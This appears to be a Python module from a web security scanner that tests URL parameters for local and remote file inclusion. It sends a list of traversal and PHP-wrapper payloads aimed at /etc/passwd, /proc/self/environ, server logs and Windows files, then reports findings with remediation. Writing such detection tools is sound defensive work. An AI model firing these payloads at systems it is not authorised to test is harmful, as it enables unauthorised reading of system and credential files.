"""LFI/RFI scanner — local and remote file inclusion vulnerabilities."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

CVSS_LFI = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS40_LFI = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
CVSS_RFI = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_RFI = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "/../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "php://input",
    "data://text/plain;base64,dGVzdA==",
    "zip://shell.zip#shell.php",
    "phar://shell.phar/shell.php",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
]

SENSITIVE_FILES = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/version"]
PASSWD_INDICATORS = ["root:x:", "root:0:0:", "daemon:x:"]
WIN_INDICATORS    = ["; for 16-bit app support", "[fonts]", "[mail]"]
WRAPPER_INDICATORS = ["cm9vdDp4", "PHB"]  # base64 of "root:x" and "<?p"

INCLUDE_PARAMS = re.compile(
    r"(page|file|include|path|template|view|layout|module|section|doc|"
    r"load|source|fetch|p=|f=|pg=|dir|folder|lang|language|bcode|image|src)",
    re.IGNORECASE
)

# PHP verbose errors that disclose the absolute web root path
PHP_WEBROOT_ERROR_INDICATORS = [
    "failed to open stream: No such file or directory in /",
    "in /var/www/",
    "in /home/",
    "in /srv/",
    "in /opt/",
    "imagecreatefrompng(",
    "imagecreatefromjpeg(",
    "file_get_contents(",
    "Warning: include(",
    "Warning: require(",
]
PATH_IN_ERROR        = re.compile(r"in (/[^\s:(]+\.php)", re.IGNORECASE)
CVSS_PATH_DISCLOSURE  = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
CVSS40_PATH_DISCLOSURE = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"


class LfiRfi(BaseModule):
    """LFI/RFI scanner."""

    NAME        = "lfi_rfi"
    DESCRIPTION = "Detect Local File Inclusion and Remote File Inclusion vulnerabilities"
    PHASE       = 8
    TAGS        = ["file", "lfi", "rfi", "cwe-98", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        crawled = self.config.extra.get("crawled_urls", [target])
        test_targets: list[tuple[str, str]] = []

        for url in crawled[:50]:
            if "?" in url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if INCLUDE_PARAMS.search(param):
                        test_targets.append((url, param))

        # Probe common include-style paths
        for path in ["/index.php", "/view", "/page"]:
            for param in ["file", "page", "include", "path", "template"]:
                test_targets.append((f"{target}{path}?{param}=home", param))

        self.log.info("Testing %d parameter(s) for LFI/RFI", len(test_targets))
        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
        )

        sem = asyncio.Semaphore(2)
        tasks = [self._test_param(url, param, target, sem)
                 for url, param in test_targets[:25]]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    async def _test_param(
        self, url: str, param_name: str, target: str, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            if not self.check_scope(url):
                return

            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)

            for payload in LFI_PAYLOADS:
                await self.rate_limit()
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(test_params)}"
                )

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=8)
                        ) as resp:
                            body = await resp.text(errors="ignore")

                    # Direct file read
                    if any(ind in body for ind in PASSWD_INDICATORS):
                        # FPReducer: verify /etc/passwd pattern with 2 probe variants
                        fp_result = await self._fp.verify(
                            "lfi", url, param_name, method="GET"
                        )
                        if not self._fp.should_report(fp_result):
                            self.log.debug(
                                "LFI suppressed by FPReducer (%s): %s[%s]",
                                fp_result.confidence.value, url, param_name,
                            )
                            continue
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:500],
                            extra={
                                "param": param_name, "payload": payload, "type": "LFI",
                                "fp_confidence": fp_result.confidence.value,
                                "fp_evidence": fp_result.evidence,
                            },
                        )
                        ev.screenshot_path = self.capture_screenshot(
                            test_url, finding_id=f"lfi_{param_name}"
                        )
                        self.new_finding(
                            title=f"LFI — /etc/passwd Read via '{param_name}'",
                            severity=Severity.CRITICAL,
                            description=(
                                f"Local File Inclusion confirmed in '{param_name}'. "
                                "Server returned /etc/passwd contents. "
                                "Attacker can read any file the web process has access to."
                            ),
                            reproduction_steps=[f"curl '{test_url}'"],
                            remediation=(
                                "Never pass user input to file inclusion functions. "
                                "Use allowlist of permitted file names, not user-supplied paths."
                            ),
                            references=["CWE-98", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LFI,
                            cvss_v40_vector=CVSS40_LFI,
                            mitre_attack=["TA0007/T1083"],
                            target=target,
                            url=url,
                        )
                        return

                    # PHP wrapper base64 output
                    elif any(ind in body for ind in WRAPPER_INDICATORS):
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:200],
                            extra={"param": param_name, "payload": payload, "type": "LFI_PHP_WRAPPER"},
                        )
                        self.new_finding(
                            title=f"LFI via PHP Wrapper — '{param_name}'",
                            severity=Severity.CRITICAL,
                            description=(
                                f"PHP wrapper LFI confirmed in '{param_name}'. "
                                "php://filter allows reading arbitrary files as base64."
                            ),
                            reproduction_steps=[f"curl '{test_url}' | base64 -d"],
                            remediation="Disable PHP wrappers; validate file paths strictly.",
                            references=["CWE-98"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LFI,
                            cvss_v40_vector=CVSS40_LFI,
                            target=target,
                            url=url,
                        )
                        return

                    elif any(ind in body for ind in WIN_INDICATORS):
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:300],
                            extra={"param": param_name, "payload": payload},
                        )
                        self.new_finding(
                            title=f"LFI — Windows File Read via '{param_name}'",
                            severity=Severity.CRITICAL,
                            description=f"LFI confirmed — win.ini read via '{param_name}'.",
                            reproduction_steps=[f"curl '{test_url}'"],
                            remediation="Validate file paths; never use user input in include/require.",
                            references=["CWE-98"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_LFI,
                            cvss_v40_vector=CVSS40_LFI,
                            target=target,
                            url=url,
                        )
                        return

                    elif any(ind in body for ind in PHP_WEBROOT_ERROR_INDICATORS):
                        path_m   = PATH_IN_ERROR.search(body)
                        web_root = path_m.group(1) if path_m else "unknown"
                        ev = Evidence(
                            request_raw=f"GET {test_url}",
                            response_raw=body[:300],
                            extra={"param": param_name, "payload": payload, "web_root": web_root},
                        )
                        self.new_finding(
                            title=f"PHP Error — Web Root Path Disclosed via '{param_name}'",
                            severity=Severity.MEDIUM,
                            description=(
                                f"A PHP verbose error in '{param_name}' discloses the absolute "
                                f"server path: {web_root}. "
                                "This reveals the filesystem layout and aids targeted LFI/RFI. "
                                "If allow_url_fopen is On, latent RFI may also be exploitable."
                            ),
                            reproduction_steps=[
                                f"curl '{test_url}'",
                                "Observe PHP error containing absolute filesystem path in response",
                            ],
                            remediation=(
                                "Set display_errors = Off in php.ini for all production environments. "
                                "Enable log_errors = On to capture errors server-side only. "
                                "Validate all file-path parameters against a strict allowlist."
                            ),
                            references=["CWE-209", "CWE-200", "OWASP A05:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_PATH_DISCLOSURE,
                            cvss_v40_vector=CVSS40_PATH_DISCLOSURE,
                            mitre_attack=["TA0007/T1082"],
                            target=target,
                            url=url,
                        )
                        return

                except Exception:
                    pass


class TestLfiRfi:
    def test_lfi_payloads(self) -> None:
        assert len(LFI_PAYLOADS) >= 8
        assert "/etc/passwd" in LFI_PAYLOADS
        assert any("php://" in p for p in LFI_PAYLOADS)

    def test_passwd_indicator(self) -> None:
        body = "root:x:0:0:root:/root:/bin/bash"
        assert any(ind in body for ind in PASSWD_INDICATORS)

    def test_include_params_pattern(self) -> None:
        assert INCLUDE_PARAMS.search("page")
        assert INCLUDE_PARAMS.search("template")
        assert INCLUDE_PARAMS.search("file")
